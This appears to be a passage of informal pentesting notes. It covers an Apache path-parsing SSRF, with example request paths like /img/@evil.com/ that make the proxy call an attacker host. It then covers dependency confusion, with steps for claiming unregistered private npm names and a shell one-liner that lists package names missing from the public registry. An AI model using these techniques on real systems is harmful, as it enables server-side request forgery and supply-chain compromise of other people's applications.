           >afterwards , /path//path2 apache treats // as an individual directory with blank name 
           
           > send processd request
           
           
           >Exploit: Any request to apache server with path /img/@evil.com/ or /img/.evil.com/
           would now allow make a arbitrary server side request to evil.com via proxy .
           
           
           
           
  





56>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>     Dependecy Confusion







https://www.youtube.com/watch?v=UHOvcdjAixY

1. In Web application if we found  package.json or packeg-lock.json then we test for dependency confusion

2. Then we test for public and private npm library 

3. Dependency confusion happen only on private library and check on https://registry.npmjs.org/underscore like underscore is available we cannot takeover

4. We can create own public librarry 

4. What happens if malicious code is uploaded to npm under these names? Is it possible that some of web app will start defaulting to the new public packages instead of the private ones?


oneliner for dependency confusion check 

find . -type f -name package.json | xargs -n1 -I{} cat {} | jq -r '.dependencies + .devDependencies' | cut -d : -f 1 | tr -d '"|}|{' | sort -u | tr -s "     " | sort -u | xargs -n1 -I{} echo "https://registry.npmjs.org/{}" | grep -v "@" | httpx -status-code -silent -content-length -mc 404
